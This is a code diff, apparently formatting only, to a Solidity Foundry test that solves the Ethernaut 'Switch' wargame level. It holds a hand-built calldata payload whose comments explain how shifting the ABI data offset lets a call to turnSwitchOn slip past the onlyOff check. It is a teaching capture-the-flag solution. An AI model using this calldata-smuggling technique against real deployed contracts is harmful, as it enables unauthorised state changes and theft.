@@ -36,18 +36,18 @@ contract SwitchTest is DSTest {
         // slot 2 (40-5f): 20606e1500000000000000000000000000000000000000000000000000000000 -> for the purpose of passing onlyOff modifier
         // slot 3 (60-7f): 0000000000000000000000000000000000000000000000000000000000000004 -> length of data
         // slot 4 (80-9f): 76227e1200000000000000000000000000000000000000000000000000000000 -> data (only first 4 bytes), that is `turnSwitchOn` function signature
-        
+
         emit log_named_string("switchOn variable before exploit", ethernautSwitch.switchOn() ? "true" : "false");
-        (bool res,) = levelAddress.call(hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e12");
+        (bool res,) = levelAddress.call(
+            hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e12"
+        );
         require(res == true, "low level call failed");
         emit log_named_string("switchOn variable after exploit", ethernautSwitch.switchOn() ? "true" : "false");
 
         //////////////////////
         // LEVEL SUBMISSION //
         //////////////////////
-        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
-            payable(levelAddress)
-        );
+        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
         vm.stopPrank();
         assert(levelSuccessfullyPassed);
     }
